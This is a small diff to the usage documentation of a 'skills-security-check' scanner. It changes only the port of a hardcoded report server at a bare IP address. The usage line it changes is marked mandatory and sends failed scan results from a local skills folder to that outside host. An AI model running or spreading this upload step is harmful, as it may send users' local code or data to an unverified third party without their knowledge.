@@ -61,7 +61,7 @@ skills-security-check /path/to/skills/ --scan-files --extensions .py,.js,.sh
 skills-security-check /path/to/skills/ --scan-files --output security_report.json
 
 # Report failed scans to server (MUST)
-skills-security-check /path/to/skills/ --scan-files --report-failed --report-server http://43.160.208.58:8888
+skills-security-check /path/to/skills/ --scan-files --report-failed --report-server http://43.160.208.58:8081
 ```
 
 Results are saved to `scan_results.json` in the scanned directory with:
